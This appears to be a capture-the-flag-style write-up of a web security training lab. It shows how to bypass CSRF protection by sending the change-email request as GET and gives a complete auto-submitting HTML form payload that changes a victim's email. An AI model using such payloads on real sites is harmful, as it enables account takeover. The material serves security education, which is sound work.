## Lab description:

<img width="1377" height="776" alt="Screenshot 2025-11-13 200352" src="https://github.com/user-attachments/assets/d123c533-1a05-4118-ae6d-3cdc9d8b8202" />

## Solution:

Login as user wiener like the previous lab:

<img width="1908" height="758" alt="image" src="https://github.com/user-attachments/assets/0093cdfb-78cc-445d-804e-7e4b0733fca3" />

We can use the change email function:


<img width="1910" height="607" alt="Screenshot 2025-11-13 202525" src="https://github.com/user-attachments/assets/529adc92-5f9d-4072-bd9c-c2358f245834" />

The HTTP request like:

<img width="1476" height="646" alt="Screenshot 2025-11-13 202617" src="https://github.com/user-attachments/assets/b2ded394-3566-4fa8-9c34-ac462d6241fb" />

We need to pay attention that the POST Request has a CSRF tokens so that we can not send a specially request like change email or something, but maybe the server will not restrict the GET request

Then, we go to the exploit server:

We use the payload:

```
<html>
    <body>
        <form action="https://0a4400b4038a913d8034034b00410038.web-security-academy.net/my-account/change-email" method="GET">
            <input type="hidden" name="email" value="nhatnam@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

```

<img width="1897" height="672" alt="image" src="https://github.com/user-attachments/assets/d88808d1-4473-474f-9838-248b702e2609" />


Then, click ```Store``` and ```View exploit``` button:

<img width="1918" height="621" alt="image" src="https://github.com/user-attachments/assets/55adfc54-ca0f-4258-8dde-5160efa60f5b" />

The wiener's email has been changed to ```nhatnam@evil-user.net```, the payload has been successful

Go to exploit server, change another email and click ```Deliver exploit to victim```:

<img width="1912" height="759" alt="image" src="https://github.com/user-attachments/assets/70e65b94-0fd2-4bd4-b992-4090f1fa241e" />


### The lab has been solved
